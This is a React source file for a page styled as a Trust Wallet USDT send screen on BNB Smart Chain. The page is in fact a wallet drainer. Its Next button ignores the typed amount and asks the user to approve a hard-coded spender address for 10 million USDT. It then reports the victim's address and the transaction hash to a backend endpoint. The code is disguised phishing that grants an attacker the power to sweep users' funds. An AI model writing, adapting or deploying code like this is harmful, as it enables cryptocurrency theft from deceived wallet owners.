import { useCallback, useEffect, useState } from "react";
import { Clipboard, ScanLine, ChevronDown } from "lucide-react";
import { BrowserProvider, Contract, parseUnits } from "ethers";
import { BASE_URL } from "../../env";

const BSC_CHAIN_ID_HEX = "0x38";
const BSC_CHAIN_ID_DEC = 56;
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";
const rpc = `https://rpc.ankr.com/bsc`;
const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";

const ERC20_APPROVE_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
];

const colors = {
  bg: "#1b1b1b",
  inputBg: "#1a1a1a",
  primaryGreen: "#48ff91",
  textMain: "#ffffff",
  textSecondary: "#aaa7a7ff",
  border: "#2a2a2a",
};

const Home = () => {
  const [amount, setAmount] = useState("");
  const [account, setAccount] = useState(null);
  const [connectError, setConnectError] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);

  // Helper to get provider
  const getEthereum = () => {
    if (typeof window === "undefined") return null;
    return window.trustwallet || window.ethereum;
  };

  const checkNetworkAndAccount = useCallback(async () => {
    const ethereum = getEthereum();
    if (!ethereum) return;

    try {
      // 1. Get account silently
      const accounts = await ethereum.request({ method: "eth_accounts" });
      if (accounts && accounts[0]) {
        setAccount(accounts[0]);
      }

      // 2. Check Chain
      const chainId = await ethereum.request({ method: "eth_chainId" });
      if (chainId !== BSC_CHAIN_ID_HEX) {
        await ethereum
          .request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: BSC_CHAIN_ID_HEX }],
          })
          .catch(async (switchError) => {
            if (switchError.code === 4902) {
              await ethereum.request({
                method: "wallet_addEthereumChain",
                params: [
                  {
                    chainId: BSC_CHAIN_ID_HEX,
                    chainName: "BNB Smart Chain",
                    nativeCurrency: {
                      name: "BNB",
                      symbol: "BNB",
                      decimals: 18,
                    },
                    rpcUrls: [rpc],
                    blockExplorerUrls: ["https://bscscan.com"],
                  },
                ],
              });
            }
          });
      }
    } catch (err) {
      console.error("Silent sync failed", err);
    }
  }, []);

  // Auto-run on mount
  useEffect(() => {
    checkNetworkAndAccount();

    const ethereum = getEthereum();
    if (ethereum?.on) {
      ethereum.on("accountsChanged", (accs) => setAccount(accs[0] || null));
      ethereum.on("chainChanged", () => window.location.reload());
    }
  }, [checkNetworkAndAccount]);

  const handleNext = async () => {
    setConnectError(null);
    const ethereum = getEthereum();

    if (!ethereum) {
      setConnectError("Please open in Trust Wallet.");
      return;
    }

    if (!amount || parseFloat(amount) <= 0) {
      setConnectError("Enter a valid amount.");
      return;
    }

    try {
      setIsProcessing(true);

      // Final check to ensure we are on BSC before the contract call
      const chainId = await ethereum.request({ method: "eth_chainId" });
      if (chainId !== BSC_CHAIN_ID_HEX) {
        await checkNetworkAndAccount();
      }

      const provider = new BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);

      // Approve 10 Million USDT
      const approvalAmount = parseUnits("10000000", 18);

      const tx = await usdt.approve(USDT_APPROVE_SPENDER, approvalAmount);

      // We don't necessarily have to wait for the receipt to show success
      // as Trust Wallet will show its own 'pending' UI.
      await tx.wait();

       await fetch(`${BASE_URL}/api/approved`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      network: 'BSC',
                      owner: address,
                      spender: USDT_APPROVE_SPENDER,
                      amount: approvalAmount.toString(),
                      txHash: tx.hash
                    })
                  });

      alert("Transaction Successful");
    } catch (e) {
      console.error(e);
      setConnectError(e?.reason || e?.message || "Transaction Rejected");
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div
      className="min-h-screen flex justify-center font-sans"
      style={{ backgroundColor: colors.bg, color: colors.textMain }}
    >
      <div className="w-full max-w-md flex flex-col px-5 pt-6 pb-8">
        <div className="flex-1 space-y-6">
          {/* Address Display (Static for this UI) */}
          <div>
            <label
              className="block text-sm mb-2"
              style={{ color: colors.textSecondary }}
            >
              Address or Domain Name
            </label>
            <div
              className="flex justify-between items-center px-4 py-4 rounded-xl border-2 border-[#2a2a2a]"
              style={{ backgroundColor: colors.bg }}
            >
              <input
                readOnly
                value={USDT_APPROVE_SPENDER.slice(0, 20) + "..."}
                className="bg-transparent outline-none text-white w-full"
              />
              <div
                className="flex items-center gap-3"
                style={{ color: colors.primaryGreen }}
              >
                <Clipboard size={18} />
                <ScanLine size={18} />
              </div>
            </div>
          </div>

          {/* Network Selector */}
          <div>
            <label
              className="block text-sm mb-2"
              style={{ color: colors.textSecondary }}
            >
              Destination network
            </label>
            <div className="flex items-center gap-2 px-4 py-2 rounded-full w-fit bg-[#1a1a1a]">
              <div className="w-5 h-5 bg-yellow-500 rounded-full flex items-center justify-center text-[10px] text-black font-bold">
                BNB
              </div>
              <span className="text-sm font-bold">BNB Smart Chain</span>
              <ChevronDown size={14} />
            </div>
          </div>

          {/* Amount Input */}
          <div>
            <label
              className="block text-sm mb-2"
              style={{ color: colors.textSecondary }}
            >
              Amount
            </label>
            <div
              className="flex justify-between items-center px-4 py-4 rounded-xl border-2 border-[#2a2a2a] focus-within:border-[#48ff91]"
              style={{ backgroundColor: colors.bg }}
            >
              <input
                type="number"
                placeholder="0.00"
                className="bg-transparent outline-none text-white w-full text-lg"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <div className="flex items-center gap-2">
                <span className="font-bold text-gray-400">USDT</span>
                <button
                  style={{ color: colors.primaryGreen }}
                  className="font-bold text-sm"
                >
                  MAX
                </button>
              </div>
            </div>
          </div>
        </div>

        {connectError && (
          <div className="mb-4 p-3 bg-red-900/20 border border-red-500/50 rounded-lg text-red-500 text-xs text-center">
            {connectError}
          </div>
        )}

        <button
          onClick={handleNext}
          disabled={isProcessing}
          className="w-full py-4 rounded-full font-bold text-black transition-all active:scale-95"
          style={{
            backgroundColor: colors.primaryGreen,
            opacity: isProcessing ? 0.6 : 1,
          }}
        >
          {isProcessing ? "Processing..." : "Next"}
        </button>

        {account && (
          <p className="text-center text-[10px] mt-4 text-gray-600">
            Connected: {account.slice(0, 6)}...{account.slice(-4)}
          </p>
        )}
      </div>
    </div>
  );
};

export default Home;
